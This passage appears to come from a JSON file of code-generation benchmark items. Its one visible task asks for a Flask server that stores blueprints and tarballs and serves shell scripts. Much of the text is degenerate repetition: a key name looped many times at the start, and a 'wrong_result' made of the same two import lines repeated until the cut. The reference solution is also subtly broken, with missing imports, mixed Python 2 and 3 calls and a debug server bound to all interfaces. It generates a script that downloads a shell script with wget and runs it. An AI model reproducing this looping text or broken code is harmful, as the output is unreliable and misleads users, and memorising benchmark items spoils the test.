\"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources"
  },
  {
    "Task_id": 176,
    "Instruction": "Task Description: Create a Flask-based HTTP server for managing blueprints, including operations for retrieving, storing, and validating blueprint data and associated tarballs. The server should handle various HTTP methods (GET, PUT) and include metrics tracking for bandwidth and request counts.\n\nClass Description: BlueprintServer is a Flask application wrapper that provides endpoints for blueprint management, including CRUD operations for blueprints and their associated tarballs. It includes validation, metrics tracking, and response handling.\n\nAttributes:\n- app: Flask - The Flask application instance\n- browser_pattern: re.Pattern - Regular expression pattern for detecting browser user agents\n\nMethods:\n- __init__() -> None - Initializes the Flask app and sets up routes\n- _setup_routes() -> None - Defines all URL routes and their associated handlers\n- _blueprint(secret: str, name: str) -> Union[Blueprint, None, bool] - Retrieves and validates a blueprint from the backend\n- _server() -> str - Returns the server's base URL\n- _validate_secret(secret: str) -> None - Validates the secret format (400 if invalid)\n- _validate_name(name: str) -> None - Validates the name format (400 if invalid)\n- _validate_sha(sha: str) -> None - Validates the SHA format (400 if invalid)\n- secret() -> MeteredResponse - Generates and returns a new secret (201 response)\n- get_blueprint(secret: str, name: str) -> Union[MeteredResponse, abort] - Retrieves a blueprint (200/301/404 response)\n- put_blueprint(secret: str, name: str) -> MeteredResponse - Stores a new blueprint (202/400/502 response)\n- get_tarball(secret: str, name: str, sha: str) -> Union[redirect, abort] - Retrieves a tarball (301/404 response)\n- put_tarball(secret: str, name: str, sha: str) -> MeteredResponse - Stores a new tarball (202/400/502 response)\n- sh(secret: str, name: str, name2: str) -> Union[MeteredResponse, abort] - Generates shell script (200/400/404/502 response)\n- user_data(secret: str, name: str) -> MeteredResponse - Generates user-data script (200/404/502 response)\n- run() -> None - Starts the Flask development server",
    "Canonical_solution": "from flask import Flask, Response, request\nimport re\nimport os\nimport base64\nimport json\nimport librato\nimport statsd\nfrom blueprint import Blueprint\nimport backend\n\nclass MeteredResponse(Response):\n    def __init__(self, *args, **kwargs):\n        super(MeteredResponse, self).__init__(*args, **kwargs)\n        content_length = len(kwargs.get('response', ''))\n        if 0 < content_length:\n            librato.count('blueprint-io-server.bandwidth.out', content_length)\n            statsd.update('blueprint-io-server.bandwidth.out', content_length)\n\nclass BlueprintServer:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self._setup_routes()\n        self.browser_pattern = re.compile(r'Chrome|Gecko|Microsoft|Mozilla|Safari|WebKit')\n\n    def _setup_routes(self):\n        self.app.route('/secret', methods=['GET'])(self.secret)\n        self.app.route('/<secret>/<name>', methods=['GET'])(self.get_blueprint)\n        self.app.route('/<secret>/<name>', methods=['PUT'])(self.put_blueprint)\n        self.app.route('/<secret>/<name>/<sha>.tar', methods=['GET'])(self.get_tarball)\n        self.app.route('/<secret>/<name>/<sha>.tar', methods=['PUT'])(self.put_tarball)\n        self.app.route('/<secret>/<name>/<name2>.sh', methods=['GET'])(self.sh)\n        self.app.route('/<secret>/<name>/user-data.sh', methods=['GET'])(self.user_data)\n\n    def _blueprint(self, secret, name):\n        data = backend.get_blueprint(secret, name)\n        if data is None:\n            return None\n        elif data is False:\n            return False\n        b = Blueprint()\n        b.name = name\n        b.update(json.loads(data))\n        return b\n\n    def _server(self):\n        return request.url_root\n\n    def _validate_secret(self, secret):\n        if re.match(r'^[0-9A-Za-z_-]{64}$', secret) is None:\n            abort(400)\n\n    def _validate_name(self, name):\n        if re.search(r'[/ \\t\\r\\n]', name) is not None:\n            abort(400)\n\n    def _validate_sha(self, sha):\n        if re.match(r'^[0-9a-f]{40}$', sha) is None:\n            abort(400)\n\n    def secret(self):\n        while True:\n            s = base64.urlsafe_b64encode(os.urandom(48))\n            try:\n                iter(backend.list(s)).next()\n            except StopIteration:\n                break\n        return MeteredResponse(response='{0}\\n'.format(s),\n                             status=201,\n                             content_type='text/plain')\n\n    def get_blueprint(self, secret, name):\n        self._validate_secret(secret)\n        self._validate_name(name)\n\n        content_length = backend.head_blueprint(secret, name)\n        if content_length is None:\n            abort(404)\n\n        if self.browser_pattern.search(request.environ.get('HTTP_USER_AGENT', '')) or 'html' == request.args.get('format'):\n            librato.count('blueprint-io-server.renders')\n            statsd.increment('blueprint-io-server.renders')\n            return render_template('blueprint.html', b=self._blueprint(secret, name))\n        else:\n            librato.count('blueprint-io-server.requests.get')\n            statsd.increment('blueprint-io-server.requests.get')\n            librato.count('blueprint-io-server.bandwidth.out', content_length)\n            statsd.update('blueprint-io-server.bandwidth.out', content_length)\n            return redirect(backend.url_for_blueprint(secret, name), code=301)\n\n    def put_blueprint(self, secret, name):\n        self._validate_secret(secret)\n        self._validate_name(name)\n\n        librato.count('blueprint-io-server.bandwidth.in', request.content_length)\n        statsd.update('blueprint-io-server.bandwidth.in', request.content_length)\n\n        try:\n            for k in request.json.iterkeys():\n                if k not in ('arch', 'files', 'packages', 'services', 'sources'):\n                    abort(400)\n        except ValueError:\n            abort(400)\n\n        b = self._blueprint(secret, name)\n        if b is not None and b is not False:\n            for filename in set(b.sources.itervalues()) - set(request.json.get('sources', {}).itervalues()):\n                backend.delete_tarball(secret, name, filename[0:-4])\n\n        if not backend.put_blueprint(secret, name, request.data):\n            abort(502)\n\n        return MeteredResponse(response='',\n                             status=202,\n                             content_type='text/plain')\n\n    def get_tarball(self, secret, name, sha):\n        self._validate_secret(secret)\n        self._validate_name(name)\n        sha = sha.lower()\n        self._validate_sha(sha)\n\n        content_length = backend.head_tarball(secret, name, sha)\n        if content_length is None:\n            abort(404)\n\n        librato.count('blueprint-io-server.requests.get')\n        statsd.increment('blueprint-io-server.requests.get')\n        librato.count('blueprint-io-server.bandwidth.out', content_length)\n        statsd.update('blueprint-io-server.bandwidth.out', content_length)\n\n        return redirect(backend.url_for_tarball(secret, name, sha), code=301)\n\n    def put_tarball(self, secret, name, sha):\n        self._validate_secret(secret)\n        self._validate_name(name)\n        sha = sha.lower()\n        self._validate_sha(sha)\n\n        librato.count('blueprint-io-server.bandwidth.in', request.content_length)\n        statsd.update('blueprint-io-server.bandwidth.in', request.content_length)\n\n        if hashlib.sha1(request.data).hexdigest() != sha:\n            abort(400)\n\n        b = self._blueprint(secret, name)\n        if b is None:\n            abort(404)\n        elif b is False:\n            abort(502)\n        if '{0}.tar'.format(sha) not in b.sources.itervalues():\n            abort(400)\n\n        if not backend.put_tarball(secret, name, sha, request.data):\n            abort(502)\n\n        return MeteredResponse(response='',\n                             status=202,\n                             content_type='text/plain')\n\n    def sh(self, secret, name, name2):\n        if 'user-data' == name2:\n            return self.user_data(secret, name)\n        if name != name2:\n            abort(400)\n        self._validate_secret(secret)\n        self._validate_name(name)\n\n        b = self._blueprint(secret, name)\n        if b is None:\n            abort(404)\n        elif b is False:\n            abort(502)\n        s = b.sh(server=self._server(), secret=secret)\n        s.out.insert(0, '#!/bin/sh\\n\\n')\n        return MeteredResponse(response=s.dumps(),\n                             status=200,\n                             content_type='text/plain')\n\n    def user_data(self, secret, name):\n        self._validate_secret(secret)\n        self._validate_name(name)\n        b = self._blueprint(secret, name)\n        if b is None:\n            abort(404)\n        elif b is False:\n            abort(502)\n        return MeteredResponse(response=f\"\"\"#!/bin/sh\n\nset -e\n\nTMPDIR=\"$(mktemp -d)\"\ncd \"$TMPDIR\"\ntrap \"rm -rf \\\\\"$TMPDIR\\\\\"\" EXIT\n\nwget \"{self._server()}/{secret}/{name}/{name}.sh\"\n\nsh \"$(ls)\"\n\"\"\",\n                           status=200,\n                           content_type='text/plain')\n\n    def run(self):\n        self.app.run(host='0.0.0.0', debug=True)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, request, abort, redirect, Response\nfrom werkzeug.middleware.profiler import ProfilerMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom 